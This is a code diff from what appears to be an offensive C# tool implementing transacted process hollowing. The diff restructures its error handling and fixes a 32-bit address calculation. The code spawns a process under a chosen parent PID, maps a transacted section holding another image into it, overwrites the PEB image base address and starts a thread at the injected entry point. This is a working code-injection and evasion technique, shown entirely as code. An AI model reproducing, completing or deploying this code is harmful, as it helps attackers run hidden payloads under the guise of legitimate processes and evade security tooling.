@@ -16,7 +16,6 @@ namespace TransactedHollowing.Library
             string windowTitle)
         {
             NTSTATUS ntstatus;
-            bool status;
             IntPtr hTransactedSection;
             IntPtr pNewSectionBase;
             IntPtr pPeb;
@@ -25,6 +24,9 @@ namespace TransactedHollowing.Library
             bool is64BitImage;
             bool is64BitTarget;
             string imagePathName;
+            bool status = false;
+            IntPtr hHollowingProcess = IntPtr.Zero;
+            IntPtr hThread = IntPtr.Zero;
             string tempFilePath = Path.GetTempFileName();
 
             if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
@@ -113,153 +115,111 @@ namespace TransactedHollowing.Library
                 return false;
             }
 
-            Console.WriteLine("[>] Trying to create transacted file.");
-            Console.WriteLine("    [*] File Path : {0}", tempFilePath);
-
-            hTransactedSection = Utilities.CreateTransactedSection(tempFilePath, imageData);
-
-            if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
+            do
             {
-                try
+                Console.WriteLine("[>] Trying to create transacted file.");
+                Console.WriteLine("    [*] File Path : {0}", tempFilePath);
+
+                hTransactedSection = Utilities.CreateTransactedSection(tempFilePath, imageData);
+
+                if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
+                    break;
+
+                status = Utilities.CreateInitialProcess(
+                    commandLine,
+                    ppid,
+                    isBlocking,
+                    windowTitle,
+                    out hHollowingProcess,
+                    out hThread);
+
+                if (!status)
+                    break;
+
+                Console.WriteLine("[>] Trying to map transacted section to the hollowing process.");
+
+                pNewSectionBase = Utilities.MapSectionToProcess(hHollowingProcess, hTransactedSection);
+
+                if (pNewSectionBase == IntPtr.Zero)
                 {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
+                    break;
                 }
-                catch
+                else
                 {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
+                    Console.WriteLine("[+] Transacted section is mapped to the hollowing process successfully.");
+                    Console.WriteLine("    [*] Section Base : 0x{0}", pNewSectionBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                 }
 
-                return false;
+                if (Environment.Is64BitProcess)
+                    pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt64() + nEntryPointOffset);
+                else
+                    pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt32() + nEntryPointOffset);
+
+                Console.WriteLine("[>] Trying to get ntdll!_PEB address for the hollowing process.");
+
+                if (!Helpers.GetProcessBasicInformation(
+                    hHollowingProcess,
+                    out PROCESS_BASIC_INFORMATION pbi))
+                {
+                    Console.WriteLine("[-] Failed to get ntdll!_PEB address for the hollowing process.");
+                    break;
+                }
+                else
+                {
+                    pPeb = pbi.PebBaseAddress;
+                    Console.WriteLine("[+] Got hollowing process basic information.");
+                    Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
+                    Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
+                }
+
+                // Overwrite ntdll!_PEB for hollowing process.
+                if (!Helpers.SetImageBaseAddress(hHollowingProcess, pPeb, pNewSectionBase))
+                {
+                    Console.WriteLine("[-] Failed to set new ntdll!_PEB.ImageBaseAddress.");
+                    break;
+                }
+
+                Console.WriteLine("[>] Trying to start hollowing process thread.");
+
+                ntstatus = NativeMethods.NtCreateThreadEx(
+                    out IntPtr hNewThread,
+                    ACCESS_MASK.THREAD_ALL_ACCESS,
+                    IntPtr.Zero,
+                    hHollowingProcess,
+                    pRemoteEntryPoint,
+                    IntPtr.Zero,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+                status = (ntstatus == Win32Consts.STATUS_SUCCESS);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to create thread.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                }
+                else
+                {
+                    Console.WriteLine("[+] Thread is resumed successfully.");
+                    NativeMethods.NtClose(hNewThread);
+                }
+            } while (false);
+
+            if (hThread != IntPtr.Zero)
+                NativeMethods.NtTerminateThread(hThread, Win32Consts.STATUS_SUCCESS);
+
+            if (hHollowingProcess != IntPtr.Zero)
+            {
+                if (!status)
+                    NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
+
+                NativeMethods.NtClose(hHollowingProcess);
             }
 
-            status = Utilities.CreateInitialProcess(
-                commandLine,
-                ppid,
-                isBlocking,
-                windowTitle,
-                out IntPtr hHollowingProcess,
-                out IntPtr hThread);
-
-            if (!status)
-            {
+            if (hTransactedSection != Win32Consts.INVALID_HANDLE_VALUE)
                 NativeMethods.NtClose(hTransactedSection);
-
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                return false;
-            }
-
-            Console.WriteLine("[>] Trying to map transacted section to the hollowing process.");
-
-            pNewSectionBase = Utilities.MapSectionToProcess(
-                hHollowingProcess,
-                hTransactedSection);
-            NativeMethods.NtClose(hTransactedSection);
-
-            if (pNewSectionBase == IntPtr.Zero)
-            {
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
-                NativeMethods.NtClose(hHollowingProcess);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Transacted section is mapped to the hollowing process successfully.");
-                Console.WriteLine("    [*] Section Base : 0x{0}", pNewSectionBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
-            }
-
-            pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt64() + nEntryPointOffset);
-
-            Console.WriteLine("[>] Trying to get ntdll!_PEB address for the hollowing process.");
-
-            if (!Helpers.GetProcessBasicInformation(
-                hHollowingProcess,
-                out PROCESS_BASIC_INFORMATION pbi))
-            {
-                Console.WriteLine("[-] Failed to get ntdll!_PEB address for the hollowing process.");
-
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
-                NativeMethods.NtClose(hHollowingProcess);
-
-                return false;
-            }
-            else
-            {
-                pPeb = pbi.PebBaseAddress;
-                Console.WriteLine("[+] Got hollowing process basic information.");
-                Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
-                Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
-            }
-
-            // Overwrite ntdll!_PEB for hollowing process.
-            if (!Helpers.SetImageBaseAddress(hHollowingProcess, pPeb, pNewSectionBase))
-            {
-                Console.WriteLine("[-] Failed to set new ntdll!_PEB.ImageBaseAddress.");
-                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
-
-                return false;
-            }
-
-            Console.WriteLine("[>] Trying to start hollowing process thread.");
-
-            ntstatus = NativeMethods.NtCreateThreadEx(
-                out IntPtr hNewThread,
-                ACCESS_MASK.THREAD_ALL_ACCESS,
-                IntPtr.Zero,
-                hHollowingProcess,
-                pRemoteEntryPoint,
-                IntPtr.Zero,
-                false,
-                0,
-                0,
-                0,
-                IntPtr.Zero);
-            NativeMethods.NtTerminateThread(hThread, Win32Consts.STATUS_SUCCESS);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create thread.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
-            }
-            else
-            {
-                Console.WriteLine("[+] Thread is resumed successfully.");
-            }
-            
-            NativeMethods.NtClose(hNewThread);
-            NativeMethods.NtClose(hHollowingProcess);
 
             try
             {
@@ -271,7 +231,9 @@ namespace TransactedHollowing.Library
                 Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
             }
 
-            return true;
+            Console.WriteLine("[*] Done.");
+
+            return status;
         }
     }
 }
